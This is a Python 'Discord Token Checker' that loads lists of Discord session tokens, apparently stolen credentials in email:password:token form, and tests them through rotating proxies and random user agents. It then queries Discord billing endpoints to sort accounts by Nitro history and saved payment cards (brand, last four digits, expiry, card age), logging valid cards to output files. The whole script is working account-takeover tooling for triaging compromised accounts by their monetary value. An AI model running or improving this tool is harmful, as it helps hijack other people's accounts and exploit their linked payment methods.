import requests
import threading
import random
import datetime
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import sys
import os

init(autoreset=True)

MAX_RETRIES = 3
THREAD_COUNT = int(input(f"{Fore.CYAN}Threads: {Fore.RESET}"))


class Logger:
    def __init__(self):
        self.lock = threading.Lock()
        self.stats = {"checked": 0, "valid": 0, "invalid": 0, "nitro_active": 0, "nitro_had": 0, "never": 0}
        self.last_update = 0
        self.print_banner()
    
    def print_banner(self):
        print(f"""
{Fore.LIGHTMAGENTA_EX}╔{'═' * 70}╗
║  {'Discord Token Checker'.center(68)}  ║
║  {'v3.0 - Enhanced Edition'.center(68)}  ║
╚{'═' * 70}╝{Fore.RESET}
""")
        self.update_header()
    
    def update_header(self):
        """Throttled header update - only every 0.5s"""
        now = datetime.datetime.now().timestamp()
        if now - self.last_update < 0.5:
            return
        self.last_update = now
        
        s = self.stats
        header = (
            f"{Fore.LIGHTBLACK_EX}[{Fore.CYAN}Checked: {s['checked']:<4}{Fore.LIGHTBLACK_EX}] "
            f"[{Fore.GREEN}Valid: {s['valid']:<3}{Fore.LIGHTBLACK_EX}] "
            f"[{Fore.RED}Invalid: {s['invalid']:<3}{Fore.LIGHTBLACK_EX}] "
            f"[{Fore.LIGHTMAGENTA_EX}💎 Active: {s['nitro_active']:<2}{Fore.LIGHTBLACK_EX}] "
            f"[{Fore.YELLOW}Had: {s['nitro_had']:<2}{Fore.LIGHTBLACK_EX}] "
            f"[{Fore.WHITE}Never: {s['never']:<3}{Fore.LIGHTBLACK_EX}]{Fore.RESET}"
        )
        
        with self.lock:
            if s['checked'] > 0:
                sys.stdout.write("\033[1A\033[K")
            print(header, flush=True)
    
    def log(self, level, icon, color, msg, detail=""):
        t = datetime.datetime.now().strftime('%H:%M:%S')
        badge = f"{Fore.LIGHTBLACK_EX}[{color}{icon} {level}{Fore.LIGHTBLACK_EX}]"
        line = f"{Fore.LIGHTBLACK_EX}[{Fore.WHITE}{t}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {badge} {Fore.WHITE}{msg}{Fore.RESET}"
        if detail:
            line += f" {Fore.LIGHTBLACK_EX}→{Fore.RESET} {color}{detail}{Fore.RESET}"
        
        with self.lock:
            print(line)
    
    def success(self, msg, detail=""): self.log("VALID", "✓", Fore.GREEN, msg, detail)
    def error(self, msg, detail=""): self.log("ERROR", "✗", Fore.RED, msg, detail)
    def info(self, msg, detail=""): self.log("INFO", "ℹ", Fore.CYAN, msg, detail)
    def warn(self, msg, detail=""): self.log("WARN", "⚠", Fore.YELLOW, msg, detail)
    def nitro(self, msg, detail=""): self.log("NITRO", "💎", Fore.LIGHTMAGENTA_EX, msg, detail)
    
    def increment(self, key):
        with self.lock:
            self.stats[key] += 1
        self.update_header()


logger = Logger()


def save(filename, content):
    os.makedirs("output", exist_ok=True)
    with open(f"output/{filename}", 'a') as f:
        f.write(content + '\n')


def extract_token(line):
    return line.strip().split(":")[-1].strip()


def format_display(line):
    """Format token display: email | token or just token"""
    parts = line.strip().split(":")
    token = parts[-1]
    
    if len(parts) >= 3 and "@" in parts[0]:
        email = parts[0]
        local, domain = email.split("@", 1)
        masked = f"{local[:2]}***@{domain}"
        return f"{masked} | {token[:12]}..."
    
    return f"{token[:18]}...{token[-6:]}"


def check_nitro(token):
    """Check Nitro status using correct Discord billing endpoints"""
    try:
        headers = {"authorization": token, "user-agent": UserAgent().random}
        proxy = get_random_proxy()
        proxies = {"https": f"http://{proxy}"} if proxy else None
        
        # Check billing payments history (most reliable)
        payments_resp = requests.get(
            "https://discord.com/api/v9/users/@me/billing/payments?limit=30",
            headers=headers, proxies=proxies, timeout=10
        )
        
        has_payment_history = False
        most_recent_payment_date = None
        
        if payments_resp.status_code == 200:
            payments = payments_resp.json()
            if payments:
                has_payment_history = True
                # Find most recent payment
                for payment in payments:
                    created_at = payment.get("created_at")
                    if created_at:
                        try:
                            payment_date = datetime.datetime.fromisoformat(created_at.replace('Z', '+00:00'))
                            if most_recent_payment_date is None or payment_date > most_recent_payment_date:
                                most_recent_payment_date = payment_date
                        except:
                            continue
        
        # Check subscriptions with include_inactive flag
        subs_resp = requests.get(
            "https://discord.com/api/v9/users/@me/billing/subscriptions?include_inactive=true",
            headers=headers, proxies=proxies, timeout=10
        )
        
        nitro_types = {1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
        
        if subs_resp.status_code == 200:
            subs = subs_resp.json()
            
            if subs:
                # Check for active subscription
                for sub in subs:
                    if sub.get("status") == 1:  # Active
                        nitro_type = nitro_types.get(sub.get("type"), f"Type {sub.get('type')}")
                        return "active", nitro_type
                
                # Find most recent ended subscription
                most_recent_end = None
                
                for sub in subs:
                    ended = (sub.get("ended_at") or 
                            sub.get("canceled_at") or 
                            sub.get("current_period_end"))
                    
                    if ended:
                        try:
                            end_date = datetime.datetime.fromisoformat(ended.replace('Z', '+00:00'))
                            if most_recent_end is None or end_date > most_recent_end:
                                most_recent_end = end_date
                        except:
                            continue
                
                if most_recent_end:
                    now = datetime.datetime.now(datetime.timezone.utc)
                    months_ago = (now - most_recent_end).days // 30
                    
                    if months_ago <= 18:  # Within 1 year 6 months
                        return "expired_recent", f"{months_ago}mo ago"
                    else:
                        return "expired_old", f"{months_ago}mo ago"
        
        # If we have payment history but no subscriptions, they had Nitro
        if has_payment_history and most_recent_payment_date:
            now = datetime.datetime.now(datetime.timezone.utc)
            months_ago = (now - most_recent_payment_date).days // 30
            
            if months_ago <= 18:
                return "expired_recent", f"{months_ago}mo ago"
            else:
                return "expired_old", f"{months_ago}mo ago"
        
        # No payment history = never had Nitro
        return "never", None
        
    except Exception as e:
        return "unknown", str(e)


def check_payment_details(token):
    """Get detailed payment information - returns list of all cards with dates"""
    try:
        headers = {"authorization": token, "user-agent": UserAgent().random}
        proxy = get_random_proxy()
        proxies = {"https": f"http://{proxy}"} if proxy else None
        
        resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
                           headers=headers, proxies=proxies, timeout=10)
        
        if resp.status_code != 200:
            return []
        
        payments = resp.json()
        results = []
        
        for payment in payments:
            card_info = {
                "brand": payment.get("brand", "Unknown"),
                "last_4": payment.get("last_4", "****"),
                "invalid": payment.get("invalid", True),
                "expires_month": payment.get("expires_month"),
                "expires_year": payment.get("expires_year"),
                "created_at": payment.get("created_at"),
                "is_default": payment.get("default", False)
            }
            
            # Calculate card age if created_at exists
            if card_info["created_at"]:
                try:
                    created = datetime.datetime.fromisoformat(card_info["created_at"].replace('Z', '+00:00'))
                    age_days = (datetime.datetime.now(datetime.timezone.utc) - created).days
                    card_info["age_months"] = age_days // 30
                    card_info["age_years"] = age_days // 365
                except:
                    card_info["age_months"] = None
                    card_info["age_years"] = None
            
            results.append(card_info)
        
        return results
    except:
        return []
                


def get_random_proxy():
    try:
        with open('proxies.txt') as f:
            proxies = [p.strip() for p in f if p.strip()]
        return random.choice(proxies) if proxies else None
    except:
        return None


def check_token(line):
    raw = line.strip()
    token = extract_token(raw)
    display = format_display(raw)
    
    headers = {"authorization": token, "user-agent": UserAgent().random}
    proxy = get_random_proxy()
    proxies = {"https": f"http://{proxy}"} if proxy else None
    
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
                               headers=headers, proxies=proxies, timeout=10)
            
            if resp.status_code == 200:
                logger.increment("checked")
                
                # Nitro check
                nitro_status, nitro_detail = check_nitro(token)
                
                if nitro_status == "active":
                    logger.nitro("Active subscription", f"{nitro_detail} | {display}")
                    save("has_nitro.txt", f"{raw} | {nitro_detail}")
                    logger.increment("nitro_active")
                
                elif nitro_status == "expired_recent":
                    logger.nitro("Expired recently", f"{nitro_detail} | {display}")
                    save("nitro_expired_recent.txt", f"{raw} | {nitro_detail}")
                    logger.increment("nitro_had")
                
                elif nitro_status in ["expired_old", "had"]:
                    logger.info("Had Nitro (old)", f"{display}")
                    save("had_nitro_old.txt", raw)
                    logger.increment("nitro_had")
                
                elif nitro_status == "never":
                    logger.info("Never had Nitro", f"{display}")
                    save("never_had_nitro.txt", raw)
                    logger.increment("never")
                
                # Get detailed payment info
                payments = check_payment_details(token)
                
                if payments:
                    # Check each payment method
                    valid_cards = [p for p in payments if not p["invalid"]]
                    invalid_cards = [p for p in payments if p["invalid"]]
                    
                    if valid_cards:
                        # Log all valid cards
                        for card in valid_cards:
                            brand = card["brand"]
                            last4 = card["last_4"]
                            age_info = ""
                            
                            if card["age_years"] is not None:
                                if card["age_years"] > 0:
                                    age_info = f" ({card['age_years']}y {card['age_months'] % 12}mo old)"
                                else:
                                    age_info = f" ({card['age_months']}mo old)"
                            
                            exp_info = ""
                            if card["expires_month"] and card["expires_year"]:
                                exp_info = f" Exp: {card['expires_month']}/{card['expires_year']}"
                            
                            logger.success("Valid payment", f"{brand} ****{last4}{age_info}{exp_info} | {display}")
                            save("valid_cards.txt", f"{raw} | {brand} ****{last4}{age_info}{exp_info}")
                        
                        logger.increment("valid")
                    
                    if invalid_cards:
                        # Log invalid cards
                        for card in invalid_cards:
                            logger.warn("Invalid card", f"{card['brand']} ****{card['last_4']} | {display}")
                            save("invalid_cards.txt", f"{raw} | {card['brand']} ****{card['last_4']}")
                    
                    if not valid_cards and not invalid_cards:
                        logger.warn("No payment", f"{display}")
                        save("no_payment.txt", raw)
                else:
                    logger.warn("No payment", f"{display}")
                    save("no_payment.txt", raw)
                
                return
            
            elif resp.status_code in [401, 403]:
                logger.increment("checked")
                logger.error("Invalid token", f"{display}")
                save("invalid_tokens.txt", raw)
                logger.increment("invalid")
                return
            
            elif attempt == MAX_RETRIES:
                logger.increment("checked")
                logger.error("HTTP error", f"{resp.status_code} | {display}")
                save("http_errors.txt", f"{raw} | {resp.status_code}")
        
        except Exception as e:
            if attempt == MAX_RETRIES:
                logger.increment("checked")
                logger.error("Exception", f"{str(e)[:30]} | {display}")
                save("exceptions.txt", f"{raw} | {e}")


def worker(queue):
    while queue:
        try:
            line = queue.pop(0)
            check_token(line)
        except IndexError:
            break


def main():
    os.system("cls" if os.name == "nt" else "clear")
    
    try:
        with open("tokens.txt") as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error("tokens.txt not found!")
        return
    
    logger.info(f"Loaded {len(lines)} tokens", f"{THREAD_COUNT} threads")
    print()
    
    threads = []
    for _ in range(min(THREAD_COUNT, len(lines))):
        t = threading.Thread(target=worker, args=(lines,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print()
    logger.success("Checking complete!", "Results in output/ folder")


if __name__ == "__main__":
    main()